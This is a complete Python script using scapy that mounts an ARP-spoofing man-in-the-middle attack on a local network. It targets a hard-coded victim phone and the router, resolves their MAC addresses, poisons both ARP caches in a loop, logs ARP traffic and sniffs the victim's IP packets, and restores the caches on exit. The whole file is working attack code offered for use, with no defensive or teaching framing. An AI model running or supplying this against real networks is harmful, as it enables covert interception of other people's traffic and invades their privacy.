import time
import threading
from scapy.layers.inet import Ether, IP
from scapy.layers.l2 import ARP
from scapy.sendrecv import srp, send, sniff

# ========== CONFIG ==========
victim_ip = "192.168.1.5"     # Phone IP
gateway_ip = "192.168.1.1"    # Router IP
interface = "Wi-Fi"           # Or 'eth0' / your actual interface name
# ============================


def get_mac(ip):
    print(f"[+] Resolving MAC for {ip}")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=2, verbose=0)
    for sent, received in ans:
        return received.hwsrc
    return None


def log_arp(pkt):
    if pkt.haslayer(ARP):
        if pkt[ARP].op == 1:
            print(f"[ARP Request] Who has {pkt[ARP].pdst}? Tell {pkt[ARP].psrc}")
        elif pkt[ARP].op == 2:
            print(f"[ARP Reply] {pkt[ARP].psrc} is at {pkt[ARP].hwsrc}")


def spoof(victim_ip, spoof_ip, victim_mac):
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=0)
    print(f"[SPOOF] Told {victim_ip} that {spoof_ip} is at my MAC.")


def restore_arp(victim_ip, victim_mac, spoof_ip, spoof_mac):
    print("[*] Restoring ARP tables...")
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=3, verbose=0)


def start_spoofing():
    while True:
        spoof(victim_ip, gateway_ip, victim_mac)
        spoof(gateway_ip, victim_ip, gateway_mac)
        time.sleep(2)


def sniff_packets():
    print("[*] Sniffing IP packets. Press Ctrl+C to stop.")
    sniff(filter="ip", prn=lambda pkt: print(f"[SNIFFED] {pkt[IP].src} → {pkt[IP].dst}"), store=0)


def start_arp_logger():
    print("[*] Logging ARP traffic (separate thread).")
    sniff(filter="arp", prn=log_arp, store=0)


if __name__ == "__main__":
    victim_mac = None
    gateway_mac = None

    try:
        victim_mac = get_mac(victim_ip)
        gateway_mac = get_mac(gateway_ip)

        if not victim_mac or not gateway_mac:
            print("[-] Could not resolve MAC addresses. Are the IPs correct and devices online?")
            exit(1)

        print(f"[+] Victim MAC: {victim_mac}")
        print(f"[+] Gateway MAC: {gateway_mac}")

        # Start ARP logger
        arp_thread = threading.Thread(target=start_arp_logger, daemon=True)
        arp_thread.start()

        # Start spoofing
        spoof_thread = threading.Thread(target=start_spoofing, daemon=True)
        spoof_thread.start()

        # Sniff packets (main thread)
        sniff_packets()

    except KeyboardInterrupt:
        print("\n[!] Detected Ctrl+C. Cleaning up...")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore_arp(gateway_ip, gateway_mac, victim_ip, victim_mac)
        print("[+] Done.")
